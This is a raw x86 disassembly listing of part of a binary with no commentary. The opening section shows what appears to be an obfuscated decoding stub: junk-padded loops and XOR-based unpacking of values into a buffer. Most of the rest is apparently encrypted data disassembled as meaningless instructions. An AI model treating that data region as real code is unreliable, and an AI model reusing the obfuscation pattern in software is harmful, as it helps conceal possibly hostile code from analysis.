  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43378b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x4338ab,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x43385f
  41026b:	or     DWORD PTR ds:0x433857,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x43382b,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x43382b
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x43382b,ecx
  410291:	cmp    DWORD PTR ds:0x43382b,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x43382b,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x43382b,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x43382b
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x43382b,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433783
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x433867,0x43381f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x433863,0x433817
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x4337d7
  41031a:	sub    DWORD PTR ds:0x43379f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x4337db,0x0
  410338:	mov    ecx,DWORD PTR ds:0x4337db
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x4337db,ecx
  410345:	cmp    DWORD PTR ds:0x4337db,0x25
  41034c:	jne    0x410362
  410352:	push   0x43392f
  410357:	push   0x43396f
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x4337db,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43381f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433893,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433893
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433893,ecx
  41038f:	cmp    DWORD PTR ds:0x433893,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x433867
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433893,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433893
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433893,ecx
  4103c8:	cmp    DWORD PTR ds:0x433893,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x4337df,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x4337d7,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x4337d7
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x4337d7,esi
  4103ff:	cmp    DWORD PTR ds:0x4337d7,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x4337d7,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0x41,al
  41049c:	(bad)
  41049f:	fdiv   QWORD PTR [eax+0x7caf7e7e]
  4104a5:	jle    0x410525
  4104a7:	xor    ebp,DWORD PTR [esp+edx*8+0x30e99d43]
  4104ae:	hlt    
  4104af:	stos   DWORD PTR es:[edi],eax
  4104b0:	cmc    
  4104b1:	rcl    BYTE PTR [edx+0x5e],0xb0
  4104b5:	ss mov ah,0xd2
  4104b8:	pop    esi
  4104b9:	fisttp DWORD PTR [ebp+0x77161c6f]
  4104bf:	jl     0x4104d9
  4104c1:	sbb    cl,0xe0
  4104c4:	fisttp DWORD PTR [ebx-0x65cee58b]
  4104ca:	(bad)  
  4104cb:	xor    BYTE PTR [ebp-0xd74a89],dh
  4104d1:	dec    eax
  4104d2:	push   ebx
  4104d3:	pushf  
  4104d4:	test   DWORD PTR gs:[esi+esi*2+0x2f7f2e61],ebp
  4104dc:	sbb    ah,BYTE PTR [edx]
  4104de:	or     cl,BYTE PTR [ecx+esi*8]
  4104e1:	sub    bh,BYTE PTR [edi+0x3961e2b8]
  4104e7:	xchg   edx,eax
  4104e8:	lds    eax,FWORD PTR [edx+0x8]
  4104eb:	add    edi,DWORD PTR [ebx-0x29]
  4104ee:	fild   WORD PTR [ebx]
  4104f0:	pop    ds
  4104f1:	push   edi
  4104f2:	mov    edx,0xecfc2d31
  4104f7:	test   al,0x87
  4104f9:	lods   eax,DWORD PTR ds:[esi]
  4104fa:	imul   esi,DWORD PTR [ebp+0x14],0x5d7df7ad
  410501:	in     al,0x3b
  410503:	and    al,0xb7
  410505:	inc    eax
  410506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410507:	pop    ss
  410508:	cmp    ecx,DWORD PTR [ebp+0x38460c9b]
  41050e:	cli    
  41050f:	xchg   edx,eax
  410510:	(bad)  
  410511:	call   0x581f:0xd9f13ab0
  410518:	les    esp,FWORD PTR ds:0xd880e4be
  41051e:	js     0x4104ef
  410520:	xor    DWORD PTR [ecx+0x10],edi
  410523:	add    eax,0x52fcaed7
  410528:	push   esi
  410529:	xchg   ebp,eax
  41052a:	xchg   esp,eax
  41052b:	mov    ebp,0x3a62a9a0
  410530:	mov    ah,0xb7
  410532:	dec    edi
  410533:	ins    DWORD PTR es:[edi],dx
  410534:	push   cs
  410535:	mov    ds:0xd9381a9b,eax
  41053a:	mov    WORD PTR [edx+edi*4-0x3],es
  41053e:	xlat   BYTE PTR ds:[ebx]
  41053f:	xor    ebx,DWORD PTR [edi]
  410541:	xor    eax,0xcc9d8e69
  410546:	shr    ah,cl
  410548:	out    0x47,al
  41054a:	inc    edi
  41054b:	cmc    
  41054c:	jbe    0x410526
  41054e:	clc    
  41054f:	push   ds
  410550:	mov    esp,0xe711cd7e
  410555:	or     edi,eax
  410557:	pop    ebx
  410558:	mov    ch,0x56
  41055a:	inc    edi
  41055b:	cli    
  41055c:	stos   DWORD PTR es:[edi],eax
  41055d:	mov    dl,0xf8
  41055f:	std    
  410560:	out    0x54,al
  410562:	iret   
  410563:	push   ebx
  410564:	ret    
  410565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410566:	mov    cl,0xe7
  410568:	test   eax,0xb7499205
  41056d:	or     al,BYTE PTR [ecx-0x79]
  410570:	mov    al,0x34
  410572:	adc    al,0x88
  410574:	mov    cl,0xf3
  410576:	daa    
  410577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410579:	jl     0x410512
  41057b:	xchg   ecx,eax
  41057c:	pop    ebp
  41057d:	dec    edx
  41057e:	test   DWORD PTR [edi],edx
  410580:	or     DWORD PTR [esi],ecx
  410582:	mov    ds:0x3ed3d081,al
  410587:	dec    esp
  410588:	jo     0x410589
  41058a:	dec    edx
  41058b:	dec    ebp
  41058c:	pop    ebp
  41058d:	outs   dx,BYTE PTR ds:[esi]
  41058e:	inc    ebp
  41058f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  410591:	sti    
  410592:	hlt    
  410593:	jmp    0x1dd2ab90
  410598:	or     eax,0x16e5306e
  41059d:	sar    bl,cl
  41059f:	and    BYTE PTR [edx],al
  4105a1:	or     al,BYTE PTR [edx]
  4105a3:	imul   esi,DWORD PTR [esi-0x7473492c],0x29
  4105aa:	enter  0x6eae,0x8f
  4105ae:	mov    eax,ds:0xe928dc4c
  4105b3:	jp     0x410547
  4105b5:	mov    WORD PTR [ebx+ebp*8+0x2b],?
  4105b9:	shl    edx,0x9
  4105bc:	pop    ss
  4105bd:	cmp    ebx,DWORD PTR [eax+0x21]
  4105c0:	int3   
  4105c1:	jmp    0x41060a
  4105c3:	fadd   st(1),st
  4105c5:	(bad)  
  4105c7:	imul   esp,edi,0xa4417b7c
  4105cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105ce:	jl     0x410563
  4105d0:	ret    
  4105d1:	das    
  4105d2:	sbb    DWORD PTR [ecx+0x7cb4540a],eax
  4105d8:	adc    eax,0xb803fc33
  4105dd:	dec    ecx
  4105de:	(bad)  
  4105df:	xor    ebp,DWORD PTR [eax]
  4105e1:	out    dx,eax
  4105e2:	mov    eax,ds:0xc867fd47
  4105e7:	icebp  
  4105e8:	(bad)  
  4105e9:	sahf   
  4105ea:	jmp    0x4105ce
  4105ec:	in     al,dx
  4105ed:	add    BYTE PTR [esi+0x7507cb78],0x4d
  4105f4:	cwde   
  4105f5:	mov    bh,BYTE PTR [ebp+0x0]
  4105f8:	mov    bl,BYTE PTR [ecx]
  4105fa:	or     al,0xd8
  4105fc:	inc    ebx
  4105fd:	pop    ecx
  4105fe:	xchg   esp,eax
  4105ff:	and    eax,0x387d15fe
  410604:	jmp    0x41063f
  410606:	xchg   DWORD PTR [eax+0x697a25e4],ecx
  41060c:	and    BYTE PTR ds:0x699b4344,dl
  410612:	xchg   ebx,eax
  410613:	cmp    ch,ah
  410615:	cli    
  410616:	rcr    BYTE PTR [ebp+0x51a99005],cl
  41061c:	adc    al,0x66
  41061e:	ret    0xbb21
  410621:	xchg   edx,eax
  410622:	jecxz  0x4105b8
  410624:	test   bl,dh
  410626:	leave  
  410627:	dec    edi
  410628:	or     ebx,DWORD PTR [esi-0x6]
  41062b:	fcmovnb st,st(2)
  41062d:	(bad)  
  41062e:	dec    esi
  41062f:	retf   0x4d34
  410632:	fdiv   st(5),st
  410634:	gs iret 
  410636:	dec    ebp
  410637:	dec    edi
  410638:	or     al,al
  41063a:	(bad)  
  41063b:	and    edx,eax
  41063d:	jnp    0x41066b
  41063f:	and    BYTE PTR [edx+0x76b1be71],0xef
  410646:	and    edx,DWORD PTR [ecx]
  410648:	out    0x24,al
  41064a:	aad    0xd1
  41064c:	mov    al,0xa1
  41064e:	(bad)  
  41064f:	nop
  410650:	xor    eax,0xd7a7c059
  410655:	jge    0x4106c1
  410657:	loop   0x41062e
  410659:	add    DWORD PTR [ebx],edx
  41065b:	ja     0x4105f6
  41065d:	ins    BYTE PTR es:[edi],dx
  41065e:	das    
  41065f:	jns    0x410684
  410661:	sti    
  410662:	and    DWORD PTR [ecx-0x5a],esi
  410665:	or     al,0xef
  410667:	mov    al,ds:0xbbb57ef2
  41066c:	cli    
  41066d:	(bad)  
  41066e:	ins    BYTE PTR es:[edi],dx
  41066f:	lods   eax,DWORD PTR ds:[esi]
  410670:	clts   
  410672:	setnp  ch
  410675:	test   al,0x13
  410678:	mov    ss,edi
  41067a:	jne    0x41068a
  41067c:	sub    edi,ecx
  41067e:	ret    0xeb0b
  410681:	cs (bad) 
  410683:	and    eax,0xc492054b
  410688:	push   ebp
  410689:	sub    eax,0xc4ea17fe
  41068e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41068f:	clc    
  410690:	pop    ebp
  410691:	dec    esp
  410692:	and    al,0x12
  410694:	or     BYTE PTR [ecx+0x24441728],dl
  41069a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41069b:	and    eax,0x2f46fac1
  4106a0:	bound  edi,QWORD PTR [ebx+0x1a]
  4106a3:	fdiv   DWORD PTR [edx+edi*2-0xd506c11]
  4106aa:	stc    
  4106ab:	adc    DWORD PTR [ebx-0x16],ebp
  4106ae:	xor    BYTE PTR [eax-0x31],bh
  4106b1:	mov    edi,0x7f9a0361
  4106b6:	cmp    ax,WORD PTR [edx]
  4106b9:	nop
  4106ba:	fsubrp st(5),st
  4106bc:	push   cs
  4106bd:	mov    ecx,0x8b2a3b5
  4106c2:	inc    edi
  4106c3:	mov    eax,edi
  4106c5:	outs   dx,DWORD PTR ds:[esi]
  4106c6:	pusha  
  4106c7:	mov    ecx,eax
  4106c9:	fwait
  4106ca:	test   BYTE PTR [esi+0xc0ca057],dh
  4106d0:	or     ch,BYTE PTR [esi]
  4106d2:	inc    edi
  4106d3:	leave  
  4106d4:	mov    ah,0x23
  4106d6:	sti    
  4106d7:	sub    ebp,ecx
  4106d9:	ins    BYTE PTR es:[edi],dx
  4106da:	push   eax
  4106db:	adc    ah,BYTE PTR [esi]
  4106dd:	int    0x30
  4106df:	mov    cl,0xd4
  4106e1:	xchg   BYTE PTR [esi+ecx*1-0x5f],bl
  4106e5:	test   BYTE PTR [edx],bl
  4106e7:	add    ebp,esi
  4106e9:	aas    
  4106ea:	push   ecx
  4106eb:	jmp    0x67e8:0x7909c9a6
  4106f2:	or     al,0x21
  4106f4:	mov    ds:0x54eee633,al
  4106f9:	ins    BYTE PTR es:[edi],dx
  4106fa:	mov    ebp,0xc50e3ec4
  4106ff:	mov    al,0x7a
  410701:	in     al,dx
  410702:	jnp    0x410781
  410704:	push   edx
  410705:	inc    ebp
  410706:	sbb    BYTE PTR [esi+0x66c72938],bh
  41070c:	push   ebp
  41070d:	jb     0x4106df
  41070f:	sbb    ebx,DWORD PTR [edi]
  410711:	fnstcw WORD PTR [ebp+0x62e4880c]
  410717:	inc    esp
  410718:	mov    dh,0x5f
  41071a:	sbb    BYTE PTR [ebp+ecx*2-0x46],bh
  41071e:	push   0xffffffd1
  410720:	xchg   ebp,eax
  410721:	clc    
  410722:	xor    ah,BYTE PTR [eax+0x74]
  410725:	push   ebp
  410726:	mov    dh,0xda
  410728:	cmp    BYTE PTR [esi+0x3a63bbff],cl
  41072e:	out    dx,al
  41072f:	les    edi,FWORD PTR [esi-0x66f5dd58]
  410735:	fs mov ebx,0xbad3ea45
  41073b:	inc    esi
  41073c:	mov    ch,0xaf
  41073e:	pop    ebp
  41073f:	cmp    DWORD PTR [edi-0x17],ebx
  410742:	(bad)  
  410745:	mov    edx,0x809dc72e
  41074a:	outs   dx,DWORD PTR ds:[esi]
  41074b:	xor    al,0xf5
  41074d:	pop    edx
  41074e:	sti    
  41074f:	and    edx,DWORD PTR [esi+0x79]
  410752:	(bad)  
  410753:	aad    0x6d
  410755:	xchg   edi,eax
  410756:	xlat   BYTE PTR ds:[ebx]
  410757:	cwde   
  410758:	mov    eax,DWORD PTR [ebp-0xc]
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x17efe5e6
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x4107b7
  41078c:	sub    BYTE PTR [edx+edx*1],al
  41078f:	sub    eax,DWORD PTR [edi]
  410791:	inc    ecx
  410792:	lahf   
  410793:	ror    BYTE PTR [esp+eiz*8],cl
  410796:	mov    al,0x27
  410798:	mov    esp,0x94b8ac4e
  41079d:	push   DWORD PTR [ebx]
  41079f:	dec    esi
  4107a0:	fwait
  4107a1:	jmp    0x410738
  4107a3:	fsubp  st(0),st
  4107a5:	clc    
  4107a6:	jns    0x41072f
  4107a8:	push   ebx
  4107a9:	(bad)  
  4107aa:	mov    al,0x25
  4107ac:	imul   esi,DWORD PTR [edi],0x9ef7e50d
  4107b2:	xchg   edi,eax
  4107b3:	mov    esp,0x6ab1690d
  4107b8:	xchg   edi,eax
  4107b9:	mov    dl,BYTE PTR [esp+eax*1-0x518975ec]
  4107c0:	xchg   edi,eax
  4107c1:	ins    BYTE PTR es:[edi],dx
  4107c2:	nop
  4107c3:	dec    ecx
  4107c4:	jg     0x410755
  4107c6:	sbb    BYTE PTR [eax-0x5e749fc3],cl
  4107cc:	out    0xf0,eax
  4107ce:	add    ebp,DWORD PTR [ebp+0x7c03bb70]
  4107d4:	(bad)  
  4107d5:	mov    esp,DWORD PTR [ebx+0x21]
  4107d8:	xchg   edi,eax
  4107d9:	aad    0x68
  4107db:	add    eax,DWORD PTR [edi-0x2c]
  4107de:	xlat   BYTE PTR ds:[ebx]
  4107df:	sahf   
  4107e0:	daa    
  4107e1:	dec    edi
  4107e2:	pop    es
  4107e3:	dec    ebp
  4107e4:	cli    
  4107e5:	and    ah,bh
  4107e7:	lods   al,BYTE PTR ds:[esi]
  4107e8:	das    
  4107e9:	add    esp,DWORD PTR [ecx]
  4107eb:	push   ecx
  4107ec:	ror    bh,0xf1
  4107ef:	xlat   BYTE PTR ds:[ebx]
  4107f0:	repnz fcmovb st,st(1)
  4107f3:	add    DWORD PTR [edi],esi
  4107f5:	cdq    
  4107f6:	push   0x2f5a1f90
  4107fb:	pop    esp
  4107fc:	in     eax,dx
  4107fd:	int3   
  4107fe:	mov    ch,0x5c
  410800:	mov    edi,edx
  410802:	ins    BYTE PTR es:[edi],dx
  410803:	fdivr  st(3),st
  410805:	and    edi,DWORD PTR [edx-0x12773c1a]
  41080b:	call   0xcab7f512
  410810:	xor    ebx,DWORD PTR [eax-0x2c519434]
  410816:	into   
  410817:	repnz ror bl,cl
  41081a:	call   0x635:0x97822425
  410821:	jns    0x410856
  410823:	and    eax,0xad1d3ced
  410828:	sub    DWORD PTR ds:[ebx-0x6fe4e5a8],esi
  41082f:	(bad)  
  410830:	cmp    ebx,DWORD PTR [eax]
  410832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410833:	inc    esi
  410834:	adc    edx,eax
  410836:	(bad)  
  410838:	lods   al,BYTE PTR ds:[esi]
  410839:	cmp    al,0x44
  41083b:	repnz pop ds
  41083d:	or     ecx,DWORD PTR [ebx]
  41083f:	xor    DWORD PTR [ebp-0x24a84857],esp
  410845:	jbe    0x410844
  410847:	ja     0x4107cb
  410849:	push   ss
  41084a:	push   edi
  41084b:	data16 cmp al,bh
  41084e:	mov    al,0xc6
  410850:	(bad)  
  410851:	pop    eax
  410852:	div    BYTE PTR [ebx]
  410854:	jns    0x410838
  410856:	in     al,0xae
  410858:	xchg   DWORD PTR [esi-0x47243a99],eax
  41085e:	das    
  41085f:	shl    DWORD PTR ds:0x2bd3434e,cl
  410865:	fwait
  410866:	jg     0x410866
  410868:	aaa    
  410869:	and    eax,0x3617c716
  41086e:	mov    ecx,0xc3b78b12
  410873:	and    DWORD PTR [ebp+ebp*1+0x30],edi
  410877:	mov    ah,0x1d
  410879:	das    
  41087a:	cdq    
  41087b:	aad    0x15
  41087d:	shr    BYTE PTR [esi],0x14
  410880:	call   FWORD PTR [ebp-0x62]
  410883:	ds retf 0xbed
  410887:	push   ss
  410888:	push   0xe
  41088a:	scas   al,BYTE PTR es:[edi]
  41088b:	test   al,0x9
  41088d:	jp     0x4108a0
  41088f:	aaa    
  410890:	push   esi
  410891:	popa   
  410892:	adc    eax,0x1b100b3a
  410897:	(bad)  
  410899:	aas    
  41089a:	mov    ebp,0xd611d22d
  41089f:	shl    ebp,1
  4108a1:	stos   DWORD PTR es:[edi],eax
  4108a2:	sbb    BYTE PTR [edx+0x62],ah
  4108a5:	add    dh,bh
  4108a7:	pop    eax
  4108a8:	mov    edi,?
  4108aa:	sbb    BYTE PTR [eax+0x15],ch
  4108ad:	mov    cl,BYTE PTR [ecx+0x75]
  4108b0:	sbb    esp,0x90c573f
  4108b6:	ss add ah,bl
  4108b9:	and    eax,0x5bee057b
  4108be:	repnz hlt 
  4108c0:	das    
  4108c1:	popa   
  4108c2:	xchg   ecx,eax
  4108c3:	(bad)  
  4108c4:	(bad)  [eax]
  4108c6:	xchg   esp,eax
  4108c7:	fld    st(1)
  4108c9:	pop    edx
  4108ca:	dec    edx
  4108cb:	cdq    
  4108cc:	call   0x5064:0xf1a1e6d7
  4108d3:	xor    DWORD PTR [esi+0x4600ea1a],0x648d7746
  4108dd:	mov    edi,0xb7fb9aa4
  4108e2:	jno    0x4108f9
  4108e4:	inc    ebx
  4108e5:	sub    eax,ecx
  4108e7:	(bad)  
  4108e8:	retf   0xdbc1
  4108eb:	enter  0xad7b,0xe9
  4108ef:	je     0x410904
  4108f1:	sub    ebx,ebx
  4108f3:	imul   ebx,ebp,0xffffffbd
  4108f6:	push   cs
  4108f7:	shr    BYTE PTR [edx],cl
  4108f9:	mov    ch,0x38
  4108fb:	es pushf 
  4108fd:	jmp    0x4108e1
  4108ff:	(bad)  
  410901:	cmp    ebp,DWORD PTR [esi+0x6ebb9a12]
  410907:	dec    esp
  410908:	neg    ah
  41090a:	jae    0x4108ef
  41090c:	mov    DWORD PTR [ecx],ebx
  41090e:	mov    eax,ds:0xa22e5144
  410913:	iret   
  410914:	(bad)  
  410916:	jle    0x4108dc
  410918:	mov    BYTE PTR [eax-0x46eca2cd],bl
  41091e:	pop    edx
  41091f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410920:	sti    
  410921:	or     DWORD PTR [edx-0x2f],0xfd335805
  410928:	ss sub al,0x8b
  41092b:	loop   0x410936
  41092d:	mov    cl,0xda
  41092f:	xchg   edi,eax
  410930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410931:	scas   eax,DWORD PTR es:[edi]
  410932:	and    DWORD PTR [ebx+0x43554da],0xffffffa3
  410939:	mov    ebx,0xec0323b
  41093e:	stos   DWORD PTR es:[edi],eax
  41093f:	sti    
  410940:	clc    
  410941:	js     0x41092a
  410943:	or     DWORD PTR [edx],0x3f
  410946:	cmp    esp,edx
  410948:	push   edx
  410949:	sbb    DWORD PTR [ecx-0x173c99a2],ebp
  41094f:	jo     0x41091c
  410951:	scas   eax,DWORD PTR es:[edi]
  410952:	inc    esi
  410953:	jbe    0x410915
  410955:	adc    eax,0x645c0b1c
  41095a:	mov    ebx,0xb49dde
  41095f:	adc    ah,bh
  410961:	fld    TBYTE PTR [eax-0x54]
  410964:	xchg   edi,eax
  410965:	adc    bl,BYTE PTR [ecx+0x6776934a]
  41096b:	fldenv [ecx]
  41096d:	sar    BYTE PTR [esi-0x20ca203],cl
  410973:	and    dl,BYTE PTR [ecx+0x41]
  410976:	xchg   ebx,eax
  410977:	lock and bh,ch
  41097a:	ror    DWORD PTR [edx+0x55],0xa5
  41097e:	cmp    DWORD PTR [edx+esi*2+0x2b386b7c],0xffffff80
  410986:	inc    esi
  410987:	pop    ebx
  410988:	jecxz  0x4109f9
  41098a:	popa   
  41098b:	xchg   BYTE PTR [edx+esi*8-0x32],ch
  41098f:	mov    ebp,0xc71bacdf
  410994:	sbb    esi,0x2f
  410997:	push   es
  410998:	push   esi
  410999:	pop    ds
  41099a:	push   ss
  41099b:	xor    eax,esp
  41099d:	lock sbb eax,0xa808866a
  4109a3:	pusha  
  4109a4:	outs   dx,BYTE PTR ds:[esi]
  4109a5:	cmp    ch,BYTE PTR [ecx]
  4109a7:	sub    al,0x83
  4109a9:	call   FWORD PTR [edx+edi*2+0x984f0a2]
  4109b0:	add    al,0x16
  4109b2:	xor    bh,BYTE PTR ds:[esi]
  4109b5:	inc    esi
  4109b6:	stc    
  4109b7:	pushf  
  4109b8:	jno    0x410960
  4109ba:	(bad)  
  4109bb:	imul   esi,DWORD PTR [esi+0x6f],0x1e
  4109bf:	ins    DWORD PTR es:[edi],dx
  4109c0:	mov    esi,0x5c1ffae
  4109c5:	data16 test BYTE PTR [eax-0x50],bh
  4109c9:	leave  
  4109ca:	out    dx,al
  4109cb:	mov    ebx,eax
  4109cd:	imul   DWORD PTR [ebx+ecx*4]
  4109d0:	push   eax
  4109d1:	and    eax,0x7d396e26
  4109d6:	lods   al,BYTE PTR ds:[esi]
  4109d7:	enter  0x771f,0x1a
  4109db:	or     DWORD PTR [edx-0x38adfa17],eax
  4109e1:	lea    esp,[esi-0x3f]
  4109e4:	cmp    al,0x11
  4109e6:	push   0xffffffa0
  4109e8:	mov    dl,0x54
  4109ea:	dec    eax
  4109eb:	mov    esi,ebp
  4109ed:	dec    esp
  4109ee:	out    0xff,al
  4109f0:	mov    esp,0x2fab48e8
  4109f5:	dec    esp
  4109f6:	jb     0x410a6a
  4109f8:	or     DWORD PTR [ecx+0x53],0x3bb9b71
  4109ff:	data16 rcl BYTE PTR [edi-0x2],1
  410a03:	mov    ecx,0x65a945b3
  410a08:	jmp    0xc32c7c38
  410a0d:	adc    esp,DWORD PTR [esi-0x2c]
  410a10:	dec    edx
  410a11:	repz push es
  410a13:	mov    es,WORD PTR [ecx+0x61]
  410a16:	and    al,0xef
  410a18:	mov    ecx,DWORD PTR [eax+0x5b]
  410a1b:	mov    edx,0xa2125200
  410a20:	xchg   ebx,eax
  410a21:	sahf   
  410a22:	ins    DWORD PTR es:[edi],dx
  410a23:	sub    dx,WORD PTR [ebp-0x67]
  410a27:	mov    cl,0xe3
  410a29:	mov    edx,0x33ea048
  410a2e:	int    0x84
  410a30:	mov    ebp,0xd4180e26
  410a35:	sub    bl,BYTE PTR [esi-0x24]
  410a38:	jmp    0x4109c4
  410a3a:	(bad)  
  410a3b:	push   edx
  410a3c:	add    eax,esi
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	shufps xmm6,xmm7,0x21
  410a53:	mov    edx,0xaf7e7ebd
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410aa7
  410a5c:	in     al,dx
  410a5d:	inc    eax
  410a5e:	sbb    ah,dh
  410a60:	fs mov dl,0xe5
  410a63:	std    
  410a64:	mov    bh,0x2c
  410a66:	lahf   
  410a67:	sbb    bl,BYTE PTR [edx+0x283a9c22]
  410a6d:	retf   
  410a6e:	jp     0x410ab5
  410a70:	int    0x31
  410a72:	adc    DWORD PTR [eax],eax
  410a74:	je     0x410a4f
  410a76:	jae    0x410a3e
  410a78:	ror    BYTE PTR [esi-0x19],cl
  410a7b:	in     eax,dx
  410a7c:	pusha  
  410a7d:	ds xor al,0x65
  410a80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a81:	loope  0x410a77
  410a83:	mov    al,ds:0xfdbd8496
  410a88:	jne    0x410b09
  410a8a:	mov    dh,BYTE PTR [ebx+0x9bc76a7]
  410a90:	mov    dh,0x89
  410a92:	out    0x69,al
  410a94:	dec    ebp
  410a95:	cmp    al,0x60
  410a97:	(bad)  
  410a98:	adc    al,0x14
  410a9a:	cli    
  410a9b:	mov    al,0x2b
  410a9d:	xor    BYTE PTR [esp+ebp*1+0x50],dl
  410aa1:	push   ebx
  410aa2:	xor    bh,BYTE PTR [ebx-0x5f]
  410aa5:	jne    0x410a28
  410aa7:	repnz add ah,dh
  410aaa:	mov    WORD PTR ds:0xde55e9e8,cs
  410ab0:	push   ebx
  410ab1:	mov    cl,0xb7
  410ab3:	loopne 0x410a59
  410ab5:	push   ecx
  410ab6:	outs   dx,BYTE PTR ds:[esi]
  410ab7:	xor    bh,BYTE PTR [edx+0x70]
  410aba:	dec    ebx
  410abb:	pop    edi
  410abc:	jns    0x410b0e
  410abe:	clc    
